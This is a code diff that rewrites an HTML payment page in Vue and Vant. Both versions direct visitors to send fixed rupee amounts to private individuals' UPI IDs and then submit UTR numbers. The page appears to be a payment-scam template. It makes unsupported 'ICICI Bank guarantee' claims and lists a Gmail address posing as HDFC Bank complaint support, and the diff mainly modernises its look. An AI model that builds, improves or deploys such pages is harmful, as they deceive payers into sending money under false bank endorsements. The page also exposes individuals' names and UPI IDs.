@@ -1,80 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>REPAYMENT</title>
-    <link rel="stylesheet" type="text/css" href="styles.css">
-    <script src="script.js" defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/vant@2.12/lib/index.css">
+  <style>
+    /* Add your custom styles here */
+    body {
+      font-family: sans-serif;
+    }
+
+    .container {
+      padding: 16px;
+    }
+
+    .title {
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+  </style>
 </head>
+
 <body>
-    <div class="box1">
-        <table width="100%">
-                <td>Amount</td>
-            <td> <h5 align="right" class=amount displap">₹ 5700 </h5></td>
-                <td><button class="cpb" onclick="copyAmount()">COPY</button></td>
-                <tr>
-                    <tr>
-                <td>VPA/UPI</td>
-              <td> <h5 align="right" class="upi-display">debsusmita1294@okaxis</h5> </td>
-                <td><button class="cpb" onclick="copyUPI()">COPY</button></td>
-            </td>
-        </table>
-        <table width="100%">
-            <tr> 
-                <tr>
-                <td>Name</td>
-                <td> <h5 align="right">Shushmita Datta</h5> </td>
-            </td>
-        </table>
-        <h3 class="a1">↓ Select payment method and pay ↓</h3><tr>
-        <table> 
-        <hr><br> </tr> 
-             <tr><input type="radio" class="rdaacls"></tr> 
-                <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882" width="63px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br></br> <hr> </tr> 
-                <br>
-            <tr><input type="radio" class="rdaacls"></tr>
-                <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="99px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
-               <br>
-            <tr><input type="radio" class="rdaacls"></tr>
-                <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="96px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
-                 <br>
-            <tr> <input type="radio" class="rdaacls"></tr>
-            <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="84px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
-     
-        <h3 class="a1">↓ Fill the UTR numbers after you done payment ↓</h3>
-        <form method="post" onsubmit="return false;">
-            UTR 
-            <input type="text" name="utr" id="utrInput" class="inp" placeholder="Input UTR number"><br>
-                </form><br>
-            <center>
-                <button type="button" class="btn1" id="submitUtrButton">Submit UTR</button>
-                </form><br>
-                <button type="button" class="btn2">Pay failed (try bank account)</button>
-            </center>
-        <tr>
-         <center>
-        <h6 style="color: lightgray; font-size: 12px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6>
- <h6 style= "color:blue;font-size:10px;"> hdfcbankcomplaintacceptance@gmail.com</center>
-        </h6>
-    </div>
-
-    <!-- Modals -->
-    <div class="modal" id="copyModal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('copyModal')">&times;</span>
-            <p id="copyMessage" class="modal-text"></p>
+  <div id="app">
+    <section class="container">
+      <div class="van-row van-row--justify-space-between">
+        <div class="van-col van-col--6">
+          <span>Amount</span>
         </div>
-    </div>
-
-    <div class="modal" id="utrModal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('utrModal')">&times;</span>
-            <h6>Confirm UTR Submission</h6>
-            <p>Are you sure you want to submit the UTR number?</p>
-            <button id="confirmButton">Yes, Submit</button>
-            <button class="closeModal" onclick="closeModal('utrModal')">Cancel</button>
+        <div class="van-col van-col--13">
+          <p>
+            <span style="font-weight: bold;"> ₹ 4200</span>
+          </p>
         </div>
-    </div>
+        <div class="van-col van-col--5">
+          <button type="button" class="van-button van-button--primary">COPY</button>
+        </div>
+      </div>
+      <div class="van-row van-row--justify-space-between">
+        <div class="van-col van-col--6">
+          <span>VPA/UPI</span>
+        </div>
+        <div class="van-col van-col--13">
+          <p>
+            <span style="font-weight: bold;">sukh4580@pnb</span>
+          </p>
+        </div>
+        <div class="van-col van-col--5">
+          <button type="button" class="van-button van-button--primary">COPY</button>
+        </div>
+      </div>
+      <div class="van-row van-row--justify-space-between">
+        <div class="van-col van-col--6">
+          <span>Name</span>
+        </div>
+        <div class="van-col van-col--13">
+          <p>
+            <span style="font-weight: bold;">SUKHVINDER SINGH</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="title">Select payment method and pay</div>
+      <van-radio-group v-model="paymentMethod">
+        <van-radio name="phonepe">
+          <img src="https://via.placeholder.com/150x20?text=PhonePe" alt="PhonePe">
+        </van-radio>
+        <van-radio name="googlepay">
+          <img src="https://via.placeholder.com/150x20?text=Google+Pay" alt="Google Pay">
+        </van-radio>
+        <van-radio name="upi">
+          <img src="https://via.placeholder.com/150x20?text=UPI" alt="UPI">
+        </van-radio>
+      </van-radio-group>
+
+      <div class="title">Fill the UTR numbers after you done payment</div>
+      <van-field v-model="utr" label="UTR" placeholder="Input UTR number" />
+      <van-button type="primary" block>Submit UTR</van-button>
+      <van-button type="warning" block>Pay failed(Try bank account)</van-button>
+
+      <div class="van-row van-row--justify-center">
+        <div class="van-col van-col--4">
+          <img src="https://via.placeholder.com/30x30?text=PhonePe" alt="PhonePe">
+        </div>
+        <div class="van-col van-col--4">
+          <img src="https://via.placeholder.com/30x30?text=Google+Pay" alt="Google Pay">
+        </div>
+        <div class="van-col van-col--4">
+          <img src="https://via.placeholder.com/30x30?text=UPI" alt="UPI">
+        </div>
+      </div>
+
+      <div style="text-align: center; font-size: 12px; color: #888;">
+        Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank
+        guarantee! Safe and reliable! If you have any questions, please contact:
+        <a href="mailto:hdfcbankcomplaintacceptance@gmail.com" style="color: royalblue;">hdfcbankcomplaintacceptance@gmail.com</a>
+      </div>
+    </section>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue@2.6/dist/vue.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vant@2.12/lib/vant.min.js"></script>
+  <script>
+    new Vue({
+      el: '#app',
+      data() {
+        return {
+          paymentMethod: '',
+          utr: '',
+        };
+      }
+    });
+  </script>
 </body>
+
 </html>
